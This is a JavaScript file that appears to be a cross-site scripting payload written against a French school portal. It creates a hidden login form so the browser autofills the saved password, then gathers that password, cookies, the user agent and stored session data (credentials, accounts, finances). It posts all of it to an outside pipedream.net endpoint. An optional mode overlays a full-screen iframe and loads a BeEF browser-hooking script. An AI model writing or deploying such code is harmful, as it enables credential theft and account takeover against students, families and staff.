const ur = new URL(document.currentScript?.src || window.location.href);

(async function ex() {
    const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
    
    // ✅ Correction 1: Récupérer l'URL correctement
    const messageLink = window.top.document.querySelector('a[href*="Messagerie"]');
    let messageid = null;
    if (messageLink) {
        try {
            messageid = new URL(messageLink.href, window.location.href);
        } catch(e) {
            console.error("Invalid message URL", e);
        }
    }
    
    const keys = [
        'accounts', 'badges', 'credentials', 'edhydration_auth',
        'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history', 'panier'
    ];
    
    // ✅ Correction: Gérer les nulls
    const accountsData = sessionStorage.getItem("accounts");
    let identifiant = null;
    try {
        identifiant = accountsData ? JSON.parse(accountsData) : null;
    } catch(e) {
        console.error("Invalid accounts data", e);
    }
    
    const form = document.createElement('form');
    form.hidden = true;
    const usernameValue = identifiant?.payload?.accounts?.[0]?.identifiant || "";
    form.innerHTML = `<input id="username" name="username" autocomplete="username" value="${usernameValue}">
                      <input id="password" name="password" autocomplete="current-password" type="password">`;
    document.body.appendChild(form);
    
    const pwdInput = document.querySelector('input[type="password"]');
    
    // ✅ Correction: Attendre la valeur avant d'envoyer
    const password = await new Promise((resolve) => {
        const interval = setInterval(() => {
            if (pwdInput && pwdInput.value !== "") {
                clearInterval(interval);
                resolve(pwdInput.value);
            }
        }, 40);
        // Timeout après 10 secondes
        setTimeout(() => {
            clearInterval(interval);
            resolve("");
        }, 10000);
    });
    
    const data = {
        t: new Date().toISOString(),
        u: navigator.userAgent,
        mid: messageid ? messageid.searchParams.get('idMessage') || "null" : "null",
        api: ur.searchParams.get("apiv") || "100.1",
        sign: ur.searchParams.get("signature") || false,
        mode: ur.searchParams.get("mode") || "Suppression",
        email: ur.searchParams.get("email") || "test@gmail.com",
        ps: password,  // ✅ Utiliser la valeur capturée
        c: document.cookie,
        s: Object.fromEntries(
            keys
                .map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
                .filter(([, v]) => v !== null)
                .map(([k, v]) => {
                    try { return [k, JSON.parse(v)]; }
                    catch { return [k, v]; }
                })
        )
    };
    
    try {
        await fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        });
    } catch(e) {
        console.error("Fetch failed", e);
    }
})();

async function iframe() {
    const i = window.top.document.createElement('iframe');
    i.src = "/";
    i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
    i.className = 'EDsploit';
    window.top.document.body.appendChild(i);
    
    i.onload = () => {
        const beef = window.top.document.createElement("script");
        beef.src = "https://beef.local/hook.js";
        beef.async = true;
        window.top.document.body.appendChild(beef);
    };
}

// ✅ Correction 2: Comparaison avec string
if (ur.searchParams.get("iframetrap") === true) {
    await iframe();
}
